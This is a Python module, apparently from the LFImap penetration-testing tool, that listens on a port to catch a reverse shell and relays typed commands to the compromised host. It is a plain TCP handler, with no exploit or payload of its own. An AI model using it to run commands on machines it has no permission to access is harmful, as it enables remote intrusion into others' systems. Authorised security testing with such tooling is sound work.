import socket
from src.utils import colors
import sys


def start_listener(listen_port):
    """Start a listener to catch the reverse shell and handle commands"""
    try:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind(("0.0.0.0", listen_port))
        listener.listen(1)
        print(
            colors.purple("[*]")
            + " Starting reverse listener on 0.0.0.0:{}".format(listen_port)
        )
        client_socket, client_address = listener.accept()

        print(
            colors.red("\n[*]") + " Connection received from {}".format(client_address)
        )
        print(
            colors.red("[*]")
            + " Press enter to spawn the shell. Type 'back' to continue or 'quit' to terminate LFImap.\n"
        )

        # Set a timeout for the socket
        client_socket.settimeout(2.0)

        while True:
            # Flush initial output
            response = b""
            while True:
                try:
                    data = client_socket.recv(4096)
                    response += data
                    if len(data) < 4096:
                        break
                except socket.timeout:
                    break
            print(response.decode(), end="")

            command = input("")
            if command.lower() in ["back"]:
                client_socket.close()
                break
            if command.lower() in ["quit"]:
                sys.exit(0)

            # Send command with newline character
            client_socket.sendall((command + "\n").encode())

            # Receive the response
            response = b""
            while True:
                try:
                    data = client_socket.recv(4096)
                    response += data
                    if len(data) < 4096:
                        break
                except socket.timeout:
                    break
            if response:
                print(response.decode(), end="")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        listener.close()